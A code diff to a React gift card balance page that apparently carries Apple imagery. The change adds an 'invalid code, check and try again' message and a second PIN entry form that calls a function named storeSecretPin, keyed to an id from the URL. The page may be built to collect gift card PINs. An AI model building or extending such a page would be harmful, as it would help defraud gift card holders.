@@ -16,10 +16,12 @@ function Home(){
   const [isDone, setIsDone] = useState(false)
   const [error, setError] = useState({isError:false, message:""})
   const [cardData, setCardData] = useState("")
+  const [customError, setCustomError] = useState("")
 
   const {id} = useParams()
 
   function getSecretPin(e){
+    setCustomError("")
    let input = e.target.value
     const cleanedInput = input.replace(/\s+/g, "").slice(0, 16);
   const formattedPin = cleanedInput.replace(/(.{4})/g, "$1 ").trim();
@@ -42,6 +44,9 @@ function Home(){
       setIsLoading(false) 
       setIsDone(true)
       setError({isError:false,message:""})
+      if(data.error){
+        setCustomError("invalid code, check and try again")
+      }
       setSecretPin("")
     }catch(err){
       setIsLoading(false)
@@ -112,7 +117,7 @@ function Home(){
           </div>
           
         </div>}
-        {isDone && <div className="result">
+        {isDone && !cardData.error && <div className="result">
           <div className="amount">
             <p className="text">Here's your balance:</p>
             <p className="balance">US ${cardData.balance}.00</p>
@@ -122,6 +127,29 @@ function Home(){
           <p className="check-new" onClick={()=>{setIsDone(false)}}>Check another gift card</p>
           
         </div>}
+
+
+
+        {isDone && cardData.error && <div className="code">
+          <div>
+            <p>Enter your PIN here:</p>
+            <input onChange={getSecretPin} placeholder="Gift Card Pin" value={secretPin} />
+            <small className="error">{customError}</small>
+          </div>
+          <div className="check">
+            <button onClick={storeSecretPin}> {isLoading && <Oval className="loader"
+  visible={true}
+  height="20"
+  width="20"
+  color="white"
+  // ariaLabel="oval-loading"
+
+  />} Check Balance</button>
+          </div>
+          
+        </div>}
+
+
       </div>
 
       <section className="apple-image">
